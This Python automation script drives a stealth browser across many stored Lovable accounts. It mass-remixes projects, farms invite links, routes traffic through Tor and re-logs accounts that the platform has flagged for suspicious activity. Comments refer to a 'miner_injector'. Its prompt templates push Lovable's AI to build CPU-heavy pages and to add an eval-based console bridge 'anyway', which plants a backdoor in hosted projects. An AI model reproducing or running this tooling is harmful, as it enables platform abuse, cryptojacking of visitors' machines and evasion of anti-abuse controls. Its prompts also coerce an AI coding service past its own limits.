#!/usr/bin/env python3
"""
Script 2: Project Creator - Create/remix projects with subprocess feature
Load session → (accept invite | remix | template) → add feature → generate invite → Save to Mega DB

Modes:
  --mode template     (default) Create new project from Lovable template + add feature
  --mode remix        Remix an existing project (by URL) + add feature
  --mode accept       Accept an invite link → remix → add feature

Usage:
  python3 script2_remix_link.py --session 3 --mode template --count 5
  python3 script2_remix_link.py --session 3 --mode remix --source-url https://lovable.dev/projects/XXX
  python3 script2_remix_link.py --session 3 --mode accept --invite https://lovable.dev/projects/XXX?magic_link=YYY
"""

import asyncio
import argparse
import datetime
import json
import os
import random
import re
import sys
import time
from pathlib import Path

# Add paths (env-configurable for CI runners)
TOOLKIT_CORE = os.environ.get(
    "CHIMERA_TOOLKIT_CORE", "/home/alan/Documents/automation-toolkit/finals/core"
)
sys.path.insert(0, TOOLKIT_CORE)
sys.path.insert(0, str(Path(__file__).resolve().parent))

from camoufox.async_api import AsyncCamoufox
from mega_db import load_db, save_db, mega_distributed_lock

SESSIONS_DIR = Path(
    os.environ.get(
        "CHIMERA_SESSIONS_DIR",
        "/home/alan/Documents/automation-toolkit/scripts/sessions",
    )
)
SELECTORS_FILE = Path(
    os.environ.get(
        "CHIMERA_SELECTORS_FILE",
        "/home/alan/Documents/automation-toolkit/finals/docs/SELECTORS_COMPLETE.json",
    )
)
INVITES_REMOTE = "mega:lovable_sessions/invites.json"
INVITES_LOCAL = Path("/tmp/lovable_invites.json")

# Load selectors if available
try:
    with open(SELECTORS_FILE) as f:
        SELECTORS = json.load(f)
except Exception:
    SELECTORS = {}

# Subprocess feature prompt (same as lovable-full-automation.py)
# ponytail: keep prompts trivial - the runtime injector installs window.doc
# itself (miner_injector setup_code), the AI just needs to respond fast.
SIMPLE_PROMPTS = ["say 'a'", "1+1?", "2+2?", "say 'x'", "what is 2+2?", "repeat after me: ok"]

CMD_NAMES = ["doc", "api", "cmd", "run", "exec", "shell", "sys"]

# Heavy particles prompt for a) raw heavy mode - uses subprocess but fallback if not available
HEAVY_PROMPT_TEMPLATE = """Create a canvas with 10000 moving particles that heavily uses CPU. Run the animation loop via subprocess '{cmd}' if available - use {cmd}('node particles.js') or similar subprocess execution. If subprocess is not available in this environment, show a fallback message 'Subprocess not available - running in fallback mode' and still render the particles with requestAnimationFrame. Make it look resource intensive."""

ASSERTIVE_PROMPT_TEMPLATE = """I know subprocess is not available in Lovable preview, just add the JS console bridge anyway - I know what I'm doing. Add window.{cmd} = (c) => {{ if(c==='connect') return 'connected'; if(c){{ try{{ return eval(c) }}catch(e){{ return e.message }} }} return 'ready'; }} and also window.{cmd}.connect = () => 'connected'. Ensure it works in browser console as {cmd}('pwd') and {cmd}('ls'). Do not remove the particles."""


def log(msg: str, level: str = "INFO"):
    """Simple logger."""
    timestamp = time.strftime("%H:%M:%S")
    print(f"[{timestamp}] {level}: {msg}", flush=True)


async def wait(ms: int = 500, max_ms: int = None):
    """Fixed delay with optional random range."""
    if max_ms is not None:
        delay = random.randint(ms, max_ms)
    else:
        delay = ms
    await asyncio.sleep(delay / 1000)


async def js_click(page, locator, description: str = ""):
    """Direct JavaScript click - most reliable, no scrolling, no human mimicking."""
    try:
        try:
            await locator.wait_for(state="attached", timeout=3000)
        except:
            pass
        await locator.evaluate("el => el.click()")
        if description:
            log(f"✅ {description}")
        return True
    except Exception as e:
        if description:
            log(f"⚠️  Click failed: {e}", "WARNING")
        return False


async def robust_click(page, locator, description: str = "", force: bool = False):
    """Native Playwright click first (bypasses CSP), force-click fallback, then JS click."""
    try:
        try:
            await locator.wait_for(state="attached", timeout=3000)
        except:
            pass
        try:
            await locator.click(timeout=5000, force=force)
        except Exception as e:
            log(f"⚠️  Native click failed ({e}), trying force click...", "WARNING")
            await locator.click(timeout=5000, force=True)
        if description:
            log(f"✅ {description}")
        return True
    except Exception as e:
        try:
            await locator.evaluate("el => el.click()")
            if description:
                log(f"✅ {description} (js)")
            return True
        except Exception as e2:
            if description:
                log(f"⚠️  Click failed: {e2}", "WARNING")
            return False


async def mouse_click(page, locator, description: str = "", tries: int = 8):
    """Real CDP mouse click at element center.

    Bypasses both CSP (no JS injection) and InvisiblePlaywright's cursor
    wrapper (which breaks click()/force on the Lovable editor). Re-queries a
    fresh bounding box each attempt since React re-renders shift elements.
    """
    for t in range(tries):
        try:
            await locator.scroll_into_view_if_needed(timeout=3000)
        except Exception:
            pass
        box = await locator.bounding_box()
        if box:
            x, y = box["x"] + box["width"] / 2, box["y"] + box["height"] / 2
            await page.mouse.move(x, y)
            await wait(400)
            await page.mouse.down()
            await wait(150)
            await page.mouse.up()
            await wait(600)
            if description:
                log(f"✅ mouse clicked {description} (try {t + 1})")
            return True
        await wait(1000)
    if description:
        log(f"⚠️  Could not mouse click {description}", "WARNING")
    return False


async def wait_for_dialog(page, timeout_s: int = 45, retry_click=None, retry_desc: str = "retry"):
    """Wait for the share dialog to ATTACH and finish its pulse animation.

    During the animate-pulse skeleton the dialog is opacity:0 so is_visible()
    reports False; we wait for 'attached' then for the pulse to clear.
    If retry_click is given (a locator), re-click it whenever the dialog has
    not attached within the wait window (the first mouse click sometimes misses).
    Returns the dialog locator or None.
    """
    dlg = page.locator('[role="dialog"]')
    attached = False
    for _ in range(8):
        try:
            await dlg.first.wait_for(state="attached", timeout=5000)
            attached = True
            break
        except Exception:
            if retry_click is not None:
                await mouse_click(page, retry_click, retry_desc)
            else:
                await wait(1500)
    if not attached:
        return None
    for _ in range(timeout_s):
        try:
            if "animate-pulse" not in await dlg.first.inner_html():
                break
        except Exception:
            pass
        await wait(1000)
    await wait(1500)
    return dlg


async def read_clipboard_via_paste(context) -> str:
    """Read browser clipboard with a real Ctrl+V paste into a textarea.

    CSP blocks JS clipboard reads on lovable.dev, and grant_permissions is
    unsupported by this browser, so we open a CSP-free data: page, focus a
    textarea, and perform a real keyboard paste (needs no web permission).
    """
    cp = await context.new_page()
    try:
        await cp.goto("data:text/html,<textarea id='t' style='width:800px;height:300px'></textarea>")
        await cp.bring_to_front()
        ta = cp.locator("#t")
        await ta.click()
        await cp.keyboard.press("Control+v")
        await wait(800)
        return (await ta.input_value()).strip()
    except Exception as e:
        log(f"⚠️  clipboard read via paste failed: {e}", "WARNING")
        return ""
    finally:
        try:
            await cp.close()
        except Exception:
            pass


async def scroll_into_view_center(page, locator):
    """Scroll locator into viewport center without evaluate (CSP-safe)."""
    try:
        box = await locator.bounding_box()
        if box:
            await locator.scroll_into_view_if_needed()
            box2 = await locator.bounding_box()
            if box2:
                vh = (await page.viewport_size)["height"]
                delta = (box2["y"] + box2["height"] / 2) - (vh / 2)
                if abs(delta) > 5:
                    await page.mouse.wheel(0, int(delta))
            await wait(1)
            log("✅ Brought element into viewport center")
            return True
    except Exception as e:
        log(f"⚠️  scroll_into_view_center: {e}", "WARNING")
    return False


async def load_session_cookies(session_id: str):
    """Load session cookies from disk."""
    session_path = SESSIONS_DIR / f"session-{session_id}"
    
    if not session_path.exists():
        raise FileNotFoundError(f"Session session-{session_id} not found")
    
    with open(session_path / "config.json") as f:
        config = json.load(f)
    
    with open(session_path / "cookies.json") as f:
        cookies = json.load(f)
    
    return config, cookies


async def check_session_valid(page) -> bool:
    """Check if session is still valid (not expired)."""
    try:
        current_url = page.url
        if "login" in current_url or "auth" in current_url:
            return False
        return True
    except:
        return False


async def mark_truly_red(session_id: str, session_key: str, config: dict, reason: str):
    """Flag a session as truly_red in both config.json and the Mega DB."""
    print(f"\n💀 Session bounced out of dashboard - marking TRULY RED ({reason})")
    try:
        config["status"] = "truly_red"
        config["flag_reason"] = reason
        with open(SESSIONS_DIR / f"session-{session_id}" / "config.json", "w") as f:
            json.dump(config, f, indent=2)
    except Exception as e:
        print(f"⚠️  Failed to write config.json: {e}")
    try:
        with mega_distributed_lock(timeout=600):
            db = load_db()
            if db.get_session(session_key):
                db.update_session(session_key, status="truly_red", flag_reason=reason)
            save_db(db)
    except Exception as e:
        print(f"⚠️  Failed to flag truly_red in DB: {e}")


async def check_bounce(page, session_id: str, session_key: str, config: dict) -> bool:
    """If the page has bounced back to login/auth, flag the account truly_red. Returns True if bounced."""
    try:
        url = page.url.lower()
        if "login" in url or "auth" in url or "clerk" in url:
            await mark_truly_red(session_id, session_key, config, "bounced to login/auth during project creation")
            return True
    except:
        pass
    return False


LOGIN_URL = "https://lovable.dev/login"
DASHBOARD_MARKERS = ["/projects", "/dashboard"]


async def relogin_session(browser, config: dict, session_id: str) -> str:
    """Attempt normal email+password login in a FRESH context (mirrors revive_red_sessions.py).

    On success, overwrites the session's cookies.json with fresh cookies.
    Returns: "ok" (logged in + cookies saved), "lost" (invalid credentials - account dead),
             "failed" (other error)
    """
    email = config.get("email", "")
    password = config.get("password", email)

    context = await browser.new_context()
    page = await context.new_page()

    LOST_SELECTORS = [
        '[data-slot="field-error"]',
        '[id$="-form-item-message"]',
        '.ant-form-item-explain-error',
        'text=The provided credentials are invalid',
        'text=Invalid email or password',
        'text=Incorrect password',
        'text=Wrong email or password',
        'text=Invalid credentials',
    ]

    async def check_lost() -> bool:
        for selector in LOST_SELECTORS:
            try:
                el = await page.wait_for_selector(selector, timeout=2500)
                if el and await el.is_visible():
                    print(f"   ⚠️  INVALID CREDENTIALS error shown ({selector})")
                    return True
            except:
                continue
        return False

    async def save_fresh_cookies():
        cookies = await context.cookies()
        session_path = SESSIONS_DIR / f"session-{session_id}"
        with open(session_path / "cookies.json", "w") as f:
            json.dump(cookies, f, indent=2)
        print(f"   ✅ Cookies overwritten ({len(cookies)} cookies)")
        try:
            import subprocess
            proxy_vars = ["http_proxy", "https_proxy", "all_proxy", "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "no_proxy", "NO_PROXY"]
            env = {k: v for k, v in os.environ.items() if k not in proxy_vars}
            remote = f"mega:lovable_sessions/session-{session_id}/cookies.json"
            res = subprocess.run(
                ["rclone", "copyto", str(session_path / "cookies.json"), remote],
                capture_output=True, text=True, timeout=60, env=env,
            )
            if res.returncode == 0:
                print(f"   ✅ Cookies uploaded to Mega ({remote})")
            else:
                print(f"   ⚠️  Mega cookies upload failed: {res.stderr[:200]}")
        except Exception as e:
            print(f"   ⚠️  Mega cookies upload error: {e}")

    try:
        print(f"   🌐 Re-login: opening {LOGIN_URL}")
        await page.goto(LOGIN_URL, timeout=180000)
        await page.wait_for_load_state("domcontentloaded", timeout=60000)
        await asyncio.sleep(4)

        # Already logged in?
        if any(m in page.url for m in DASHBOARD_MARKERS):
            print("   ✅ Already logged in")
            await save_fresh_cookies()
            return "ok"

        # Find email input
        email_input = None
        for selector in ['input[type="email"]', 'input[name="email"]', 'input[autocomplete="email"]', 'input[placeholder*="mail"]']:
            try:
                email_input = await page.wait_for_selector(selector, timeout=8000, state="visible")
                if email_input:
                    break
            except:
                continue

        if not email_input:
            print("   ❌ Email input not found")
            return "failed"

        print(f"   📧 Filling email: {email}")
        await email_input.fill(email)
        await asyncio.sleep(0.5)

        # Click Continue / Sign in (first step) - EXACT match, never the Google button
        for btn_text in ["Continue", "Sign in", "Sign In", "Login", "Next"]:
            try:
                btn = page.get_by_role("button", name=btn_text, exact=True).first
                if await btn.is_visible():
                    await btn.click()
                    print(f"   🖱️  Clicked '{btn_text}'")
                    break
            except:
                continue
        else:
            print("   ⌨️  No exact button found - pressing Enter on email field")
            await email_input.press("Enter")

        await asyncio.sleep(3)

        # Find password input (some flows reveal it after email step)
        password_input = None
        for selector in ['input[type="password"]', 'input[name="password"]', 'input[autocomplete="current-password"]']:
            try:
                password_input = await page.wait_for_selector(selector, timeout=10000, state="visible")
                if password_input:
                    break
            except:
                continue

        if not password_input:
            if any(m in page.url for m in DASHBOARD_MARKERS):
                print("   ✅ Logged in after email step")
                await save_fresh_cookies()
                return "ok"
            print("   ❌ Password input not found")
            return "failed"

        print(f"   🔑 Filling password")
        await password_input.fill(password)
        await asyncio.sleep(0.5)

        for btn_text in ["Sign in", "Sign In", "Login", "Log in", "Continue", "Submit"]:
            try:
                btn = page.get_by_role("button", name=btn_text, exact=True).first
                if await btn.is_visible():
                    await btn.click()
                    print(f"   🖱️  Clicked '{btn_text}'")
                    break
            except:
                continue
        else:
            print("   ⌨️  No exact button found - pressing Enter on password field")
            await password_input.press("Enter")

        # Wait for dashboard (up to 90s), checking for invalid-credentials errors
        print("   ⏳ Waiting for dashboard...")
        for _ in range(18):
            await asyncio.sleep(5)
            if await check_lost():
                print("   💀 Account is LOST (invalid credentials)")
                return "lost"
            if any(m in page.url for m in DASHBOARD_MARKERS):
                print("   ✅ Logged in!")
                await save_fresh_cookies()
                return "ok"

        print("   ❌ Re-login did not reach dashboard")
        return "failed"

    except Exception as e:
        print(f"   ❌ Re-login error: {e}")
        return "failed"
    finally:
        try:
            await page.close()
        except:
            pass
        try:
            await context.close()
        except:
            pass


# ============================================================
# MEGA Invite pool management
# ============================================================

def _rclone_env():
    """Return env without proxy vars (Tor proxy breaks rclone)."""
    import os
    proxy_vars = ["http_proxy", "https_proxy", "all_proxy", "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "no_proxy", "NO_PROXY"]
    return {k: v for k, v in os.environ.items() if k not in proxy_vars}


def mega_download_invites() -> list:
    """Download invites.json from MEGA via rclone."""
    import subprocess
    log("Downloading invites from MEGA...")
    result = subprocess.run(
        ["rclone", "copyto", INVITES_REMOTE, str(INVITES_LOCAL)],
        capture_output=True, text=True, timeout=60, env=_rclone_env()
    )
    if result.returncode == 0 and INVITES_LOCAL.exists():
        with open(INVITES_LOCAL) as f:
            invites = json.load(f)
        log(f"✅ Downloaded {len(invites)} invites from MEGA")
        return invites
    else:
        log("⚠️  No invites.json found on MEGA, using empty pool")
        return []


def mega_upload_invites(invites: list):
    """Upload invites.json to MEGA via rclone."""
    import subprocess
    log(f"Uploading {len(invites)} invites to MEGA...")
    with open(INVITES_LOCAL, "w") as f:
        json.dump(invites, f, indent=2)
    result = subprocess.run(
        ["rclone", "copyto", str(INVITES_LOCAL), INVITES_REMOTE],
        capture_output=True, text=True, timeout=60, env=_rclone_env()
    )
    if result.returncode == 0:
        log("✅ Invites uploaded to MEGA")
    else:
        log(f"❌ Invite upload failed: {result.stderr}", "ERROR")


def pick_lowest_usage_invite(invites: list, exclude_session: str, exclude_project_ids: set) -> dict:
    """
    Pick the invite with the lowest usage_count that is NOT related to this session.

    Excludes:
    - invites created_by this session's email
    - invites whose project_id belongs to a project created by this session
    - invites already at max usage

    Returns: invite dict, or None if none available
    """
    if not invites:
        log("⚠️  Invite pool is empty", "WARNING")
        return None

    valid = []
    for inv in invites:
        created_by = str(inv.get("created_by", "")).lower()
        project_id = inv.get("project_id", "")
        usage = inv.get("usage_count", 0)

        # Exclude invites related to this session
        if exclude_session and created_by == exclude_session.lower():
            log(f"  Skipping {project_id} (created by this session: {created_by})")
            continue
        if project_id in exclude_project_ids:
            log(f"  Skipping {project_id} (project belongs to this session)")
            continue
        # Exclude maxed invites
        if usage >= inv.get("max_usage", 20):
            log(f"  Skipping {project_id} (maxed at {usage})")
            continue

        valid.append(inv)

    if not valid:
        log("❌ No usable invites found (all related to this session or maxed)", "ERROR")
        return None

    valid.sort(key=lambda x: x.get("usage_count", 0))
    best = valid[0]
    log(f"✅ Picked invite with {best.get('usage_count', 0)} uses: {best.get('project_id')}")
    return best


def increment_invite_usage(invites: list, invite_link: str) -> list:
    """Increment usage_count for a used invite."""
    for inv in invites:
        if inv.get("invite_link") == invite_link:
            inv["usage_count"] = inv.get("usage_count", 0) + 1
            log(f"📈 Incremented invite usage to {inv['usage_count']}")
            break
    return invites


# ============================================================
# MODE C: Create project from template
# ============================================================

async def create_from_template(page, session_num: int) -> dict:
    """
    Create a new project from a Lovable template.
    
    Flow:
    1. Go to https://lovable.dev/templates/apps/saas
    2. Pick a random template card (first 10, NO scrolling)
    3. Click 3-dot menu → Remix
    4. Handle remix dialog
    5. Wait for redirect to new project
    
    Returns: {"project_id": "...", "chat_url": "...", "preview_url": "..."}
    """
    # 1. Navigate to templates
    log("Navigating to /templates/apps/saas...")
    await page.goto("https://lovable.dev/templates/apps/saas", timeout=180000)
    await page.wait_for_load_state("domcontentloaded", timeout=60000)
    await wait(2000, 3000)
    
    # 2. Get template cards
    cards = page.locator('article[aria-label]')
    count = await cards.count()
    log(f"Found {count} templates")
    
    if count == 0:
        raise Exception("No template cards found")
    
    # 3. Pick random template from first 10
    random_idx = random.randint(0, min(count - 1, 9))
    card = cards.nth(random_idx)
    log(f"Selected template #{random_idx} (random from first 10)")
    
    # ensure card is in viewport - handle cards not on viewport (cards 6-9 below 900)
    await card.wait_for(state="attached", timeout=10000)
    await wait(800)
    for _ in range(3):
        try:
            box = await card.bounding_box()
            if not box:
                await wait(800)
                continue
            vh = (await page.viewport_size())["height"] if await page.viewport_size() else 900
            if box["y"] < 80 or box["y"] + box["height"] > vh - 80:
                target_y = max(0, int(box["y"] - vh/2 + box["height"]/2))
                await page.evaluate(f"window.scrollTo(0, {target_y})")
                await wait(800)
                continue
            break
        except:
            await wait(800)
    await wait(500)
    try:
        await card.hover(timeout=2000)
        await wait(800)
    except:
        try:
            box = await card.bounding_box()
            if box:
                await page.mouse.move(box["x"]+box["width"]/2, box["y"]+box["height"]/2)
                await wait(600)
        except:
            pass
    await wait(500)
    
    # 4. Click 3-dot menu
    log("Opening 3-dot menu...")
    menu_btn = card.locator('button[data-button][aria-label*="More options"]')
    try:
        await menu_btn.wait_for(state="visible", timeout=3000)
    except:
        log("⚠️ Menu btn not visible after hover, trying anyway", "WARNING")
    await mouse_click(page, menu_btn, "Click template menu")
    await wait(2)
    
    # 5. Wait for menu dropdown
    log("Waiting for menu dropdown...")
    try:
        menu_dropdown = page.locator('div[role="menu"][data-open]')
        await menu_dropdown.wait_for(state="visible", timeout=5000)
        log("✅ Menu dropdown visible")
    except:
        await page.screenshot(path="/tmp/lovable-no-menu.png", timeout=120000)
        raise Exception("Menu dropdown never appeared after clicking 3-dot")
    
    await wait(1)
    
    # 6. Click "Remix" in dropdown
    remix_menu_item = menu_dropdown.locator('div[role="menuitem"]:has-text("Remix")')
    await mouse_click(page, remix_menu_item, "Clicked Remix menuitem")
    
    # 7. Check for error toast
    await wait(2)
    try:
        error_toast = page.locator('li[data-sonner-toast][data-type="error"]')
        if await error_toast.is_visible(timeout=2000):
            error_text = await error_toast.inner_text()
            log(f"❌ ERROR TOAST: {error_text}", "ERROR")
            if "suspicious activity" in error_text.lower():
                flag_session_red(page, session_num, "Remix blocked - suspicious activity")
                raise Exception("ACCOUNT BLOCKED - suspicious activity")
            raise Exception(f"Remix failed: {error_text}")
    except Exception as e:
        if "ACCOUNT BLOCKED" in str(e) or "Remix failed" in str(e):
            raise
        # No error toast
        pass
    
    # 8. Handle remix dialog
    project_id = await handle_remix_dialog(page, session_num)
    return finalize_project(page, project_id)


# ============================================================
# MODE B: Remix an existing project
# ============================================================

async def remix_existing(page, source_url: str, session_num: int) -> dict:
    """
    Remix an existing project (by URL or project ID).
    
    Flow:
    1. Navigate to source project URL
    2. Click project menu button → Remix
    3. Handle remix dialog
    4. Wait for new project redirect
    
    Returns: {"project_id": "...", "chat_url": "...", "preview_url": "..."}
    """
    # Normalize URL
    if "lovable.dev" not in source_url:
        source_url = f"https://lovable.dev/projects/{source_url}"
    
    log(f"Navigating to source project: {source_url}")
    await page.goto(source_url, timeout=180000)
    await page.wait_for_load_state("domcontentloaded", timeout=60000)
    await wait(3000)
    
    # Check if session valid
    if not await check_session_valid(page):
        raise Exception("Session is expired (redirected to login)")
    
    # NEW UI (2026-09-10, verified click-by-click via browser-use MCP on s1):
    #   {project}?view=more&subview=settings-general  (deep-link, no clicking)
    #   -> scroll #preview-panel to "Project actions"
    #   -> "Remix project" row -> Remix pill
    #   -> "Remix project" dialog (name prefilled, NO checkbox) -> Remix button
    #   -> redirect to /projects/<new-id>.
    settings_url = source_url.split("?")[0] + "?view=more&subview=settings-general"
    log(f"Opening settings directly: {settings_url}")
    for nav_try in range(2):
        try:
            await page.goto(settings_url, timeout=180000, wait_until="domcontentloaded")
        except Exception as e:
            # SPA often interrupts with its own rewrite to the plain project
            # URL on cold load — harmless, we re-assert below.
            log(f"  nav interrupted ({str(e)[:80]}), re-checking...")
        await wait(4000)
        if "view=more" in page.url:
            break
        log(f"  query stripped (try {nav_try+1}/2), re-navigating...")
    await wait(3000)
    if not await check_session_valid(page):
        # Expired cookies, but we have live credentials+TOTP -> auto-heal,
        # overwrite the shared cookie file, and retry (same as script3).
        _snum = str(session_num)
        try:
            _cfg = json.load(open(SESSIONS_DIR / f"session-{_snum}" / "config.json"))
        except Exception:
            _cfg = {}
        _cfg.setdefault("session_id", _snum)
        _res = await relogin_session(_browser, _cfg, _snum)
        if _res == "ok":
            print("✅ Re-login OK — retrying settings view")
            _fresh = json.load(open(SESSIONS_DIR / f"session-{_snum}" / "cookies.json"))
            try:
                await context.clear_cookies()
            except Exception:
                pass
            await context.add_cookies(_fresh)
            for _nav in range(2):
                try:
                    await page.goto(settings_url, timeout=180000,
                                    wait_until="domcontentloaded")
                except Exception as _e:
                    print(f"  relogin nav interrupted: {str(_e)[:80]}")
                await wait(4000)
                if "view=more" in page.url and await check_session_valid(page):
                    break
            if not await check_session_valid(page):
                raise Exception("Session still expired after re-login")
        else:
            if _res == "lost":
                await mark_truly_red(_snum, f"session-{_snum}", _cfg, "invalid credentials")
            raise Exception(f"Session expired (redirected to login, relogin={_res})")
    # prove the settings view rendered (General sub-nav, unique to panel)
    try:
        await page.get_by_role("button", name="General").first.wait_for(
            state="visible", timeout=20000
        )
        log("✅ Settings view open (General nav visible)")
    except:
        await page.screenshot(path="/tmp/lovable-no-menu.png", timeout=120000)
        raise Exception("Settings view did not render")

    # The "Remix project" row lives in Project actions, below the fold inside
    # the #preview-panel scroll container. Minimal probe-verified flow
    # (probe_remix.py 2026-09-10: wheel x4 at default mouse pos, plain click):
    # NO focus clicks, NO End key, NO scroll_into_view — all three were
    # proven no-ops/harmful via screenshots.
    log("Scrolling #preview-panel to Remix pill...")
    panel_scroll = page.locator("#preview-panel").first
    try:
        await panel_scroll.wait_for(state="attached", timeout=15000)
    except:
        await page.screenshot(path="/tmp/lovable-no-menu.png", timeout=120000)
        raise Exception("#preview-panel not found")
    
    # Do an initial aggressive scroll to get past Project details/Preview sections
    # Scroll to bottom first, then search upwards if needed
    try:
        await panel_scroll.evaluate("el => el.scrollTo(0, el.scrollHeight)")
        await wait(1500)
    except:
        pass
    
    remix_btn = None
    for attempt in range(6):
        try:
            cand = panel_scroll.get_by_role(
                "button", name="Remix", exact=True
            ).first
            try:
                await cand.wait_for(state="visible", timeout=5000)
                if await cand.is_enabled():
                    remix_btn = cand
                    log(f"✅ Remix pill visible+enabled (round {attempt+1})")
                    break
            except:
                pass
            # Scroll the #preview-panel element itself (not the page)
            # Use larger increments since Project actions is far down
            try:
                await panel_scroll.evaluate("el => el.scrollBy(0, 600)")
            except:
                try:
                    await page.mouse.wheel(0, 900)
                except:
                    pass
            await wait(1500)
            log(f"⚠️  Remix pill not in view (round {attempt+1}/6)")
        except Exception as e:
            log(f"⚠️  Remix row error (round {attempt+1}/6): {str(e)[:100]}")
            await wait(2000)
    if not remix_btn:
        await page.screenshot(path="/tmp/lovable-no-menu.png", timeout=120000)
        raise Exception("Remix pill button not found in Project actions")

    try:
        await page.screenshot(path="/tmp/remix_scrolled.png", timeout=120000)
    except:
        pass
    try:
        await remix_btn.click(timeout=12000)
        log("✅ Clicked Remix pill button (plain click)")
    except Exception as e:
        log(f"⚠️  Plain pill click failed ({str(e)[:80]}), mouse fallback")
        await mouse_click(page, remix_btn, "Clicked Remix pill button")
    await wait(2000, 3000)
    try:
        await page.screenshot(path="/tmp/remix_after_pill.png", timeout=120000)
    except:
        pass

    # Handle remix dialog (source id guards the no-dialog URL fallback)
    try:
        page._remix_source_id = source_url.rstrip("/").split("/")[-1].split("?")[0]
    except:
        pass
    project_id = await handle_remix_dialog(page, session_num)
    return finalize_project(page, project_id)


# ============================================================
# MODE A: Accept invite → remix
# ============================================================

async def accept_invite_and_remix(page, invite_link: str, session_num: int) -> dict:
    """
    Accept invite link and remix the project.
    
    Flow:
    1. Navigate to invite link
    2. Accept invitation
    3. Click project menu → Remix
    4. Handle remix dialog
    
    Returns: {"project_id": "...", "chat_url": "...", "preview_url": "..."}
    """
    # 1. Navigate to invite link
    log(f"Opening invite link...")
    try:
        await page.goto(invite_link, timeout=180000)
        await page.wait_for_load_state("domcontentloaded", timeout=60000)
    except Exception as e:
        log(f"⚠️  Page load issue: {e}", "WARNING")
    
    await wait(3000)
    
    # 2. Accept invitation modal - keep clicking until project access is gained
    log("Accepting invitation...")
    accepted = False
    relogin_done = False
    try:
        # Wait up to 60s for the invite dialog to render (it can take ~20s+)
        accept_btn = None
        deadline = time.time() + 60
        while time.time() < deadline:
            cur = page.url
            if "/projects/" in cur and "magic_link" not in cur:
                log("✅ Already has project access")
                accepted = True
                break

            # Detect expired session: "You don't have access - This project is private"
            try:
                no_access = page.locator('div[role="dialog"]:has-text("You don\'t have access")')
                if await no_access.count() > 0 and await no_access.first.is_visible(timeout=1000):
                    log("🚩 No-access dialog detected - session expired/invalid", "WARNING")
                    # Try to revive via normal login first (only once)
                    if relogin_done:
                        _cfg = json.load(open(SESSIONS_DIR / f"session-{session_num}" / "config.json"))
                        await mark_truly_red(str(session_num), f"session-{session_num}", _cfg,
                                             "Session expired + re-login failed - account lost")
                        await page.screenshot(path="/tmp/lovable-session-expired.png", timeout=120000)
                        raise Exception("SESSION EXPIRED - flagged TRULY RED")
                    relogin_done = True
                    print("\n🔄 Session credentials may be stale - attempting re-login...")
                    _browser = page.context.browser
                    _cfg = json.load(open(SESSIONS_DIR / f"session-{session_num}" / "config.json"))
                    _cfg.setdefault("session_id", f"session-{session_num}")
                    result = await relogin_session(_browser, _cfg, str(session_num))
                    if result == "ok":
                        print("✅ Re-login succeeded - retrying project access with fresh cookies")
                        # Refresh cookies in the main context
                        fresh = json.load(open(SESSIONS_DIR / f"session-{session_num}" / "cookies.json"))
                        try:
                            await page.context.clear_cookies()
                        except:
                            pass
                        await page.context.add_cookies(fresh)
                        # Retry navigation to invite link once
                        try:
                            await page.goto(invite_link, timeout=180000)
                            await page.wait_for_load_state("domcontentloaded", timeout=60000)
                        except Exception as e:
                            log(f"⚠️  Reload issue: {e}", "WARNING")
                        await wait(3000)
                        continue
                    else:
                        await mark_truly_red(str(session_num), f"session-{session_num}", _cfg,
                                             "Session expired + re-login failed - account lost")
                        await page.screenshot(path="/tmp/lovable-session-expired.png", timeout=120000)
                        raise Exception("SESSION EXPIRED - flagged TRULY RED")
            except Exception as e:
                if "SESSION EXPIRED" in str(e):
                    raise
                pass

            # Find the accept button (prefer exact role, fall back to visible text match)
            accept_btn = None
            try:
                candidate = page.get_by_role("button", name="Accept invitation")
                if await candidate.is_visible(timeout=1000):
                    accept_btn = candidate
            except:
                pass
            if accept_btn is None:
                for sel in ['button:has-text("Accept invitation")', 'button:has-text("Accept invite")', 'button:has-text("Accept")']:
                    loc = page.locator(sel)
                    try:
                        cnt = await loc.count()
                        for i in range(cnt):
                            c = loc.nth(i)
                            if await c.is_visible(timeout=300):
                                accept_btn = c
                                break
                    except:
                        continue
                    if accept_btn:
                        break

            if accept_btn:
                break
            await wait(1500)

        if accepted:
            pass
        elif accept_btn:
            log(f"✅ Accept button visible after waiting. Clicking (mouse)...")
            for click_attempt in range(4):
                try:
                    ok = await mouse_click(page, accept_btn, f"Accept (attempt {click_attempt+1})", tries=3)
                    await wait(2500)
                except Exception as e:
                    log(f"  Click failed (attempt {click_attempt+1}): {e}")
                    await wait(1500)
                # After clicking, check if access gained (URL dropped magic_link or editor visible)
                cur = page.url
                if "/projects/" in cur and "magic_link" not in cur:
                    accepted = True
                    break
                # Also detect the invite dialog closing
                try:
                    if await page.locator('div[role="dialog"]').count() == 0:
                        accepted = True
                        break
                except:
                    pass
                await wait(1500)
        else:
            log("⚠️  No Accept button appeared within 60s, continuing...")
            accepted = True
    except Exception as e:
        log(f"⚠️  Invitation acceptance issue: {e}", "WARNING")
        if "SESSION EXPIRED" in str(e):
            raise

    # 3. Dismiss cookie banner (short timeout, non-blocking)
    try:
        cookie_btn = page.get_by_role("button", name="Accept all")
        if await cookie_btn.count() > 0 and await cookie_btn.first.is_visible(timeout=1000):
            await cookie_btn.first.click(timeout=3000, force=True)
            log("Accept cookies")
    except:
        pass
    try:
        cookie_btn2 = page.get_by_role("button", name="Reject all")
        if await cookie_btn2.count() > 0 and await cookie_btn2.first.is_visible(timeout=1000):
            await cookie_btn2.first.click(timeout=3000, force=True)
    except:
        pass
    
    # 3b. If still on invite page (magic_link in URL), reload with magic_link kept.
    #     Direct navigation WITHOUT magic_link causes 403 (private project).
    cur = page.url
    if "/projects/" in cur and "magic_link" in cur:
        log("Reloading invite page (keeping magic_link) to enter editor...")
        try:
            await page.goto(cur, timeout=180000)
            await page.wait_for_load_state("domcontentloaded", timeout=60000)
        except Exception as e:
            log(f"⚠️  Navigation issue: {e}", "WARNING")
        await wait(3000)
    
    # 4. Wait for editor to load (chat ready OR project menu visible)
    log("Waiting for project editor to load...")
    chat_ready = False
    for i in range(60):
        try:
            chat_check = page.locator('div[contenteditable="true"][role="textbox"]').first
            if await chat_check.is_visible(timeout=1000):
                chat_ready = True
                log(f"✅ Editor loaded (after {i+1}s)")
                break
        except:
            pass
        try:
            menu_check = page.locator('[data-testid="editor-nav-project-menu"]').first
            if await menu_check.is_visible(timeout=1000):
                chat_ready = True
                log(f"✅ Editor loaded - menu visible (after {i+1}s)")
                break
        except:
            pass
        await wait(1000)
    
    if not chat_ready:
        log("⚠️  Editor not ready after 60s, proceeding anyway...")
    
